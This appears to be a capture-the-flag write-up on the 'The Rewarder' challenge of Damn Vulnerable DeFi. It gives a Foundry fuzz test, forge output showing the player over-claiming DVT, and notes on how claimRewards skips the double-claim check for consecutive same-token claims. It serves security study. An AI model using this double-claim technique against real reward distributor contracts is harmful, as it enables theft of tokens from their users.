# Fuzzing

Logic:

Dynamically generates a sequence of Claim objects based on a uint8[] array, interpreting each bit as an instruction to determine which token to claim. 

A bit value of 0 corresponds to a DVT claim, and a bit value of 1 corresponds to a WETH claim. Bits are read one at a time, from right to left, and once all 8 bits of a byte are consumed, the loop moves to the next byte in the tokensBits array—wrapping around if necessary. This mechanism allows for compact and reproducible generation of randomized claim sequences


```solidity
    function testFuzzClaimBitsAsPlayer(uint8[] memory tokensBits) public {
        vm.assume(tokensBits.length > 0 && tokensBits.length < 20); // lets limit nb claims 

        vm.startPrank(player);

        uint256 count = tokensBits.length;
        uint256 playerDVTAmount = 11524763827831882; // already deposited (lets see the json) 
        uint256 playerWETHAmount = 1171088749244340; // already deposited (lets see the json)

        // Load proofs again
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));

        // Build claims from the bit pattern
        Claim[] memory claims = new Claim[](count);

        uint256 bitSourceIndex = 0;
        uint256 bits = tokensBits[bitSourceIndex];
        uint256 bitOffset = 0;

        for (uint256 i = 0; i < count; i++) {
            if (bitOffset >= 8) {
                bitOffset = 0;
                bitSourceIndex++;
                bits = tokensBits[bitSourceIndex];
            }

            uint8 bit = uint8((bits >> bitOffset) & 1);
            bitOffset++;

            if (bit == 0) {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: playerDVTAmount,
                    tokenIndex: 0,
                    proof: merkle.getProof(dvtLeaves, 188)
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: playerWETHAmount,
                    tokenIndex: 1,
                    proof: merkle.getProof(wethLeaves, 188)
                });
            }
        }

        try distributor.claimRewards(claims, tokens) {
            console.log("Claim succeeded with %s claims", count);
            for (uint256 j = 0; j < claims.length; j++) {
                console.log(" - Token %s", claims[j].tokenIndex == 0 ? "DVT" : "WETH");
            }
        } catch {
            console.log("Claim reverted with %s claims", count);
            for (uint256 j = 0; j < claims.length; j++) {
                console.log(" - Token %s", claims[j].tokenIndex == 0 ? "DVT" : "WETH");
            }
        }

        assertLe(dvt.balanceOf(player), playerDVTAmount, "player got too much DVT");
        assertLe(weth.balanceOf(player), playerWETHAmount, "player got too much WETH");

        vm.stopPrank();
    }
```

    ectario@pwnMachine:~/DamnVulnDefi(master⚡) » forge clean && forge test --match-test testFuzzClaimBitsAsPlayer -vv

    Compiler run successful!
    proptest: Saving this and future failures in cache/fuzz/failures
    proptest: If this test was run on a CI system, you may wish to add the following line to your copy of the file. (You may need to create it.)
    cc 7ce10e5d8657b20c794b21eb08d3d959b55d8fb706cb01c8c87711b4949f533b

    Ran 1 test for test/the-rewarder/TheRewarder.t.sol:TheRewarderChallenge
    [FAIL: player got too much DVT: 46099055311327528 > 11524763827831882; counterexample: calldata=0x740f7da9000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000003500000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000a6 args=[[3, 53, 3, 9, 2, 166]]] testFuzzClaimBitsAsPlayer(uint8[]) (runs: 4, μ: 18602387, ~: 20003644)
    Logs:
    - Token WETH
    - Token WETH
    - Token DVT
    - Token DVT
    - Token DVT
    - Token DVT
    
# Notes

The function `claimRewards()` in `TheRewarderDistributor` is intended to allow a user to claim multiple token rewards across multiple batches while preventing double-claims. It uses a bitmap-based mechanism to track which `batchNumber`s a user has already claimed.

The check is enforced by `_setClaimed()`:
```solidity
if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
```

In `TheRewarderDistributor.sol`:
```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (address(token) != address(0)) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }

    token = inputTokens[inputClaim.tokenIndex];
    bitsSet = 1 << bitPosition;
    amount = inputClaim.amount;
} else {
    bitsSet = bitsSet | 1 << bitPosition;
    amount += inputClaim.amount;
}
```

The problem arises because `_setClaimed()` is only called **when the token changes**. This means that for all **contiguous claims using the same token**, `_setClaimed()` is called only **once**, at the transition point (either from a different token, or at the end of the loop).

As a result, multiple claims on the **same token** within the same batch are **accumulated silently**, and only the **first appearance** triggers a check. All other claims for that same token (as long as they are consecutive) skip the `AlreadyClaimed` logic.

For example:

```solidity
[DVT, DVT, DVT, WETH]
```

This will call `_setClaimed()` only twice:
- Once for the first DVT claim, accumulating the bits for all DVT entries.
- Once when switching to WETH.

Each `_setClaimed()` call checks the bitmap **once**, and only once per token.

However, if the token switches *and then switches back*, like in:

```solidity
[DVT, WETH, DVT]
```

The last DVT will again trigger `_setClaimed()` for `DVT`, and if the same batch bit was already set in the first pass, it will fail — as expected.

This enables the following:

```solidity
[DVT, DVT, DVT, WETH, WETH]
```

Each token is checked only once, and the batch bit is set once per token — effectively allowing you to re-claim the same `batchNumber` multiple times, provided the claims are grouped by token.

But:

```solidity
[DVT, WETH, DVT]
```

Will fail on the last DVT, because `_setClaimed()` is called again for the same batch/token combination, and the bit is already set.


